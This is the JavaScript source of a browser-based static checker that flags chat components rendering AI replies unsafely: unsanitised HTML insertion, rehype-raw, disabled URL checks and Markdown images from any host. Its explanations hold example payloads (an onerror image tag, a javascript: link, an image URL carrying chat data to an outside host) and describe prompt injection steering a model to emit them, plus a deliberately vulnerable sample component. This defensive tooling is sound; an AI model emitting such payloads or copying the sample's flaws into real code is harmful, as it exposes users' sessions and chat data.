/* PatchLabs free AI chat rendering check (/tools/chat-render-check). Runs only in the browser: no network, no storage.
   Reads the component that shows AI replies (React, Vue, Svelte or plain JavaScript) and flags the two ways a reply
   reaches the user's browser unsafely: (1) inserted as HTML without a sanitiser (marked or showdown output into
   dangerouslySetInnerHTML, innerHTML, v-html or {@html}; react-markdown with rehype-raw and no rehype-sanitize;
   a urlTransform that lets javascript: links through), and (2) Markdown images that load from any address, which
   carry chat data out with no click. Finding PL-024. Static reading only. Also loads under Node for tests. */
(function (root) {
  'use strict';

  var RANK = { critical: 0, high: 1, medium: 2, low: 3 };

  // Replace comments with spaces, keeping newlines so line numbers stay right. Strings and template literals are respected.
  function stripComments(s) {
    var out = '', i = 0, q = null;
    while (i < s.length) {
      var c = s[i], n = s[i + 1];
      if (q) { out += c; if (c === '\\') { out += n || ''; i += 2; continue; } if (c === q) q = null; i++; continue; }
      if (c === '"' || c === "'" || c === '`') { q = c; out += c; i++; continue; }
      if (c === '/' && n === '/' && s[i - 1] !== ':') { while (i < s.length && s[i] !== '\n') { out += ' '; i++; } continue; }
      if (c === '/' && n === '*') { out += '  '; i += 2; while (i < s.length && !(s[i] === '*' && s[i + 1] === '/')) { out += s[i] === '\n' ? '\n' : ' '; i++; } out += '  '; i += 2; continue; }
      if (c === '<' && s.slice(i, i + 4) === '<!--') { out += '    '; i += 4; while (i < s.length && s.slice(i, i + 3) !== '-->') { out += s[i] === '\n' ? '\n' : ' '; i++; } out += '   '; i += 3; continue; }
      out += c; i++;
    }
    return out;
  }

  var SANITIZE = /DOMPurify|\bpurify\s*\.\s*sanitize|\bsanitize(Html|HTML)?\s*\(|\bsanitizeHtml\b|\bfilterXSS\s*\(|\bxss\s*\(|\bescapeHtml\s*\(|\bescapeHTML\s*\(|\bhtmlEscape\s*\(/;
  var MARKED = /\bmarked\s*(\.\s*parse(Inline)?\s*)?\(|\bnew\s+Marked\s*\(|\bmarkedInstance\b/;
  var SHOWDOWN = /\bmakeHtml\s*\(|\bshowdown\b/;
  var MDIT = /markdown-?it|MarkdownIt|\bmd\s*\.\s*render(Inline)?\s*\(/;
  var MDIT_HTML = /html\s*:\s*true/;
  var UNSAFE_PIPE = /allowDangerousHtml\s*:\s*true|sanitize\s*:\s*false/;
  var REACT_MD = /<\s*(ReactMarkdown|Markdown|MarkdownHooks|MarkdownAsync|Streamdown)\b|from\s+['"](react-markdown|streamdown)['"]/;
  var OTHER_MD = /\b(remark|unified|micromark|snarkdown|markdownToHtml|marked|showdown|MarkdownIt|markdownit)\b/;
  var AI_NAME = /\b(message|messages|msg|reply|replies|response|content|answer|completion|output|text|chunk|delta|assistant|ai|bot|llm|gpt|chat|stream|streamed|generated|summary|result)\w*/i;
  var IMG_LIMIT = /\bimg\s*:\s*(\(|function|\w+\s*[,}])|\bimg\s*\(\s*\{|disallowedElements\s*=\s*\{[^}]*['"]img['"]|FORBID_TAGS[^\]]*['"]img['"]|allowedImagePrefixes|IMAGE_HOSTS|ALLOWED_IMAGE|allowedImageHosts|renderer\s*\.\s*image\s*=|\bimage\s*\([^)]*\)\s*\{|renderer\.rules\.image\s*=|rules\s*\.\s*image\s*=/;

  function scan(text) {
    var src = String(text || '');
    if (!src.trim()) return { error: 'Paste the component that shows your AI replies first.' };
    if (src.length > 400000) return { error: 'That is more than 400 KB. Paste one component at a time.' };
    var clean = stripComments(src);
    var L = clean.split('\n'), raw = src.split('\n');
    var findings = [], passed = [];
    var lineAt = function (idx) { return clean.slice(0, idx).split('\n').length; };
    var firstLine = function (re) { for (var i = 0; i < L.length; i++) if (re.test(L[i])) return i + 1; return 0; };
    var code = function (n) { return (raw[n - 1] || '').trim().slice(0, 220); };
    var add = function (f) { f.code = f.code || code(f.line); findings.push(f); };
    var pass = function (line, label) { if (!passed.some(function (p) { return p.label === label; })) passed.push({ line: line, label: label }); };

    var looksLikeCode = /=>|function\b|import\s|require\s*\(|<\w+[\s>]|const\s|let\s|var\s|\{@html|v-html/.test(clean);
    if (!looksLikeCode) return { error: 'This doesn’t look like code. Paste the component that shows the AI’s replies (for example Chat.tsx or Message.vue).', lines: L.length };

    // Where a name is defined: the definition line and a few after it (enough for a useMemo or a small helper).
    function definition(name) {
      if (!name) return '';
      var re = new RegExp('(?:const|let|var)\\s+' + name + '\\s*=|function\\s+' + name + '\\s*\\(|\\b' + name + '\\s*\\(\\s*[\\w,\\s{}:]*\\)\\s*\\{|\\b' + name + '\\s*:\\s*(?:function|\\()');
      for (var i = 0; i < L.length; i++) if (re.test(L[i])) return L.slice(i, i + 6).join('\n');
      return '';
    }

    // 1. HTML sinks.
    var SINKS = [
      { re: /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*([\s\S]{1,240}?)\}\s*\}/g, name: 'dangerouslySetInnerHTML' },
      { re: /\.\s*(?:inner|outer)HTML\s*=(?!=)\s*([^;\n]{1,240})/g, name: 'innerHTML' },
      { re: /insertAdjacentHTML\s*\(\s*['"][\w-]+['"]\s*,\s*([^\n]{1,240})\)/g, name: 'insertAdjacentHTML' },
      { re: /\bv-html\s*=\s*"([^"]{1,240})"/g, name: 'v-html' },
      { re: /\{@html\s+([^}]{1,240})\}/g, name: '{@html}' },
      { re: /document\s*\.\s*write(?:ln)?\s*\(([^\n]{1,240})\)/g, name: 'document.write' }
    ];
    SINKS.forEach(function (s) {
      s.re.lastIndex = 0; var m;
      while ((m = s.re.exec(clean))) {
        var expr = m[1].trim().replace(/[,;]\s*$/, '');
        var line = lineAt(m.index + m[0].indexOf(m[1]));
        if (/^(['"])[^'"]*\1$/.test(expr) || (/^`[^`]*`$/.test(expr) && expr.indexOf('${') < 0) || /^JSON\s*\.\s*stringify\s*\(/.test(expr) || /^['"`]{2}$/.test(expr)) continue; // fixed text or JSON-LD
        // Follow names one or two steps back to where the value is made.
        var trace = expr, seenNames = {};
        for (var step = 0; step < 2; step++) {
          var names = (trace.match(/[A-Za-z_$][\w$]*/g) || []).filter(function (n) { return !seenNames[n] && !/^(props|this|await|new|return|true|false|null|undefined|__html|const|let|var|function|useMemo|useState|parse|render|DOMPurify)$/.test(n); });
          var more = '';
          names.slice(0, 6).forEach(function (n) { seenNames[n] = 1; more += '\n' + definition(n); });
          trace += more;
        }
        if (SANITIZE.test(trace)) { pass(line, 'Sanitises HTML before inserting it'); continue; }
        var lib = MARKED.test(trace) ? 'marked' : SHOWDOWN.test(trace) ? 'showdown' : (MDIT.test(trace) && MDIT_HTML.test(clean)) ? 'markdown-it with html: true' : UNSAFE_PIPE.test(trace) ? 'a Markdown pipeline with raw HTML allowed' : '';
        if (lib) {
          add({ line: line, kind: 'md-html', severity: 'high', id: 'PL-024', title: 'Markdown from ' + lib + ' inserted as HTML with no sanitiser',
            detail: (lib === 'marked' ? 'marked passes any HTML in the text straight through and its own docs say it doesn’t sanitise. ' : lib === 'showdown' ? 'showdown passes any HTML in the text straight through. ' : 'Raw HTML in the text reaches the page. ') +
              'If this text is a model reply, anyone who can steer the model (a chat message, an uploaded file, a page it reads) can make it write <img src=x onerror=…> and run script as your user, with their session.',
            fix: 'Best: render with react-markdown instead (it escapes HTML):\n  <ReactMarkdown skipHtml>{reply}</ReactMarkdown>\nOr keep ' + lib.split(' ')[0] + ' and sanitise first:\n  import DOMPurify from "dompurify";\n  const html = DOMPurify.sanitize(marked.parse(reply));' });
          continue;
        }
        if (MDIT.test(trace)) { pass(line, 'markdown-it escapes raw HTML (html option off)'); continue; }
        var ai = AI_NAME.test(expr);
        add({ line: line, kind: 'raw-html', severity: ai ? 'high' : 'medium', id: 'PL-024',
          title: ai ? 'Reply text inserted as HTML with ' + s.name : 'HTML inserted with ' + s.name + ' from a value the check can’t trace',
          detail: ai ? 'The value looks like message or reply text and nothing on the way sanitises it, so any HTML in it runs as part of your page.'
            : 'Nothing on the way sanitises this value. If any of it comes from a model reply, a user or your database, HTML in it runs as part of your page. If it’s fixed text you wrote, this is fine.',
          fix: s.name === 'dangerouslySetInnerHTML' ? 'Show text as text: {reply}\nor Markdown with <ReactMarkdown skipHtml>{reply}</ReactMarkdown>\nor sanitise: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }}'
            : s.name === 'innerHTML' ? 'el.textContent = reply;   // text, never markup\nor el.innerHTML = DOMPurify.sanitize(html);'
            : 'Render the text as text (Vue {{ reply }}, Svelte {reply}), or sanitise it first with DOMPurify.sanitize(html).' });
      }
    });

    // 2. react-markdown / unified with rehype-raw and no rehype-sanitize after it.
    var rawUse = -1, sanUse = -1, m2, reRaw = /\brehypeRaw\b|['"]rehype-raw['"]/g, reSan = /\brehypeSanitize\b|['"]rehype-sanitize['"]/g;
    while ((m2 = reRaw.exec(clean))) { if (!/^\s*import\b|require\s*\(/.test(L[lineAt(m2.index) - 1])) { rawUse = m2.index; break; } }
    while ((m2 = reSan.exec(clean))) { if (!/^\s*import\b|require\s*\(/.test(L[lineAt(m2.index) - 1])) sanUse = m2.index; }
    if (rawUse >= 0 && !(sanUse > rawUse)) {
      add({ line: lineAt(rawUse), kind: 'rehype-raw', severity: 'high', id: 'PL-024', title: sanUse >= 0 ? 'rehype-sanitize runs before rehype-raw, so raw HTML gets through' : 'rehype-raw with no rehype-sanitize after it',
        detail: 'react-markdown escapes HTML by default; rehype-raw turns that off. Its README says to use it only for Markdown you trust, and a model reply isn’t that. Any <img onerror> or <iframe> the model writes becomes real.',
        fix: 'Remove rehypeRaw (use remark-gfm for tables), or sanitise after it:\n  rehypePlugins={[rehypeRaw, rehypeSanitize]}' });
    } else if (rawUse >= 0) pass(lineAt(sanUse), 'rehype-sanitize runs after rehype-raw');

    // 3. Pipelines and options that let raw HTML or javascript: links through.
    var unsafePipe = firstLine(UNSAFE_PIPE);
    if (unsafePipe && !findings.some(function (f) { return f.kind === 'md-html'; }) && !(sanUse >= 0)) {
      add({ line: unsafePipe, kind: 'pipe', severity: 'high', id: 'PL-024', title: 'Markdown pipeline set to keep raw HTML',
        detail: 'allowDangerousHtml: true (remark-rehype, rehype-stringify, micromark) or sanitize: false (remark-html) keeps any HTML in the reply. With no sanitiser after it, that HTML runs in your page.',
        fix: 'Remove the option, or add rehype-sanitize as the last plugin before stringify:\n  .use(remarkRehype, { allowDangerousHtml: true }).use(rehypeRaw).use(rehypeSanitize).use(rehypeStringify)' });
    }
    var mditHtml = MDIT.test(clean) && firstLine(MDIT_HTML);
    if (mditHtml && !findings.some(function (f) { return f.kind === 'md-html'; }) && !SANITIZE.test(clean)) {
      add({ line: mditHtml, kind: 'mdit-html', severity: 'medium', id: 'PL-024', title: 'markdown-it set to html: true',
        detail: 'With html: true, markdown-it copies HTML in the text into its output. If that output is inserted into the page anywhere, a model reply can run script.',
        fix: 'Leave html off (the default):\n  const md = new MarkdownIt({ linkify: true });\nor sanitise the output with DOMPurify before inserting it.' });
    }
    var urlT = firstLine(/urlTransform\s*=\s*\{\s*(null|\(?\s*(\w+)\s*\)?\s*=>\s*\2\s*)\}|transform(Link|Image)Uri\s*=\s*\{\s*(null|false)\s*\}|urlTransform\s*:\s*(null|\(?\s*(\w+)\s*\)?\s*=>\s*\6)\s*[,}]/);
    if (urlT) {
      add({ line: urlT, kind: 'url', severity: 'high', id: 'PL-024', title: 'react-markdown’s URL check is switched off',
        detail: 'The default urlTransform removes javascript: and other dangerous links. Replacing it with one that returns every URL unchanged lets a reply include [click me](javascript:…), which runs script when clicked. The README warns about exactly this.',
        fix: 'Delete the urlTransform prop. If you need to rewrite URLs, start from the default:\n  import { defaultUrlTransform } from "react-markdown";\n  urlTransform={(url) => defaultUrlTransform(myRewrite(url))}' });
    }

    // 4. Markdown images that load from any address.
    var mdLine = [firstLine(REACT_MD), firstLine(MARKED), firstLine(SHOWDOWN), firstLine(/\bmd\s*\.\s*render\s*\(|new\s+MarkdownIt|markdownit\s*\(/), firstLine(/\b(remark|unified|micromark)\s*\(/)]
      .filter(Boolean).sort(function (a, b) { return a - b; })[0] || 0;
    var imgLimit = firstLine(IMG_LIMIT);
    var allowedNoImg = /allowedElements\s*=\s*\{\s*\[([^\]]*)\]/.exec(clean);
    if (allowedNoImg && !/['"]img['"]/.test(allowedNoImg[1])) imgLimit = imgLimit || lineAt(allowedNoImg.index);
    if (mdLine && !imgLimit) {
      add({ line: mdLine, kind: 'image', severity: 'medium', id: 'PL-024', title: 'Markdown images load from any address',
        detail: 'A reply containing ![x](https://their-site.example/p.png?d=…) makes the browser fetch that address the moment it’s shown, with no click, and whatever chat text the model put in it lands in their server log. Sanitisers allow https images, so this needs its own fix. Bing Chat and Claude both had to close this in 2023.',
        fix: 'Only load images from hosts you choose; show a link for the rest:\n  components={{ img: ({ src = "", alt = "" }) => {\n    const host = new URL(src, location.href).hostname;\n    return IMAGE_HOSTS.has(host) ? <img src={src} alt={alt} /> : <a href={src} rel="noopener noreferrer nofollow">{alt || "image link"}</a>;\n  } }}\nBack it with a Content-Security-Policy img-src.' });
    } else if (mdLine && imgLimit) pass(imgLimit, 'Images limited or replaced (check the host list)');

    // What the component gets right.
    var reactMd = firstLine(REACT_MD);
    if (reactMd && rawUse < 0 && !urlT) pass(reactMd, (/Streamdown/.test(clean) ? 'Streamdown' : 'react-markdown') + ' with no raw HTML plugin, so HTML in replies is escaped');
    var skip = firstLine(/\bskipHtml\b/);
    if (skip) pass(skip, 'skipHtml drops any HTML in the reply');
    var csp = firstLine(/Content-Security-Policy/i);
    if (csp) pass(csp, 'Sets a Content-Security-Policy');

    findings.sort(function (a, b) { return RANK[a.severity] - RANK[b.severity] || a.line - b.line; });
    var renders = !!(mdLine || findings.length || passed.length || /\{@html|v-html|innerHTML|dangerouslySetInnerHTML/.test(clean));
    return { lines: L.length, findings: findings, passed: passed, markdown: !!mdLine, renders: renders };
  }

  function prompt(r) {
    var lines = ['This component shows replies written by an AI model. Fix these problems, keep the formatting working, and show me the full new file:', ''];
    r.findings.forEach(function (f, i) { lines.push((i + 1) + '. Line ' + f.line + ': ' + f.title + '. ' + f.detail.split('. ')[0].replace(/\.+$/, '') + '.'); });
    lines.push('', 'Rules: treat every model reply as untrusted text. Render it with react-markdown using skipHtml, no rehype-raw and no custom urlTransform (or run any HTML through DOMPurify.sanitize before inserting it). Add a custom img component that only renders images from these hosts: [your domains], and a plain link with rel="noopener noreferrer nofollow" for any other host. Don’t change anything else.');
    return lines.join('\n');
  }

  // A made-up chat component with the usual mistakes.
  function sample() {
    return [
      'import { useMemo } from "react";',
      'import { marked } from "marked";',
      'import ReactMarkdown from "react-markdown";',
      'import rehypeRaw from "rehype-raw";',
      '',
      '// Chat bubble for assistant replies',
      'export function Bubble({ message }: { message: { role: string; content: string } }) {',
      '  const html = useMemo(() => marked.parse(message.content), [message.content]);',
      '  return <div className="bubble" dangerouslySetInnerHTML={{ __html: html }} />;',
      '}',
      '',
      '// Conversation log on the admin page',
      'export function AdminLog({ rows }: { rows: { id: string; reply: string }[] }) {',
      '  return rows.map((r) => (',
      '    <ReactMarkdown key={r.id} rehypePlugins={[rehypeRaw]}>',
      '      {r.reply}',
      '    </ReactMarkdown>',
      '  ));',
      '}'
    ].join('\n');
  }

  var api = { scan: scan, prompt: prompt, sample: sample };
  if (typeof module !== 'undefined' && module.exports) module.exports = api;
  else root.PLChatCheck = api;
})(typeof window !== 'undefined' ? window : this);
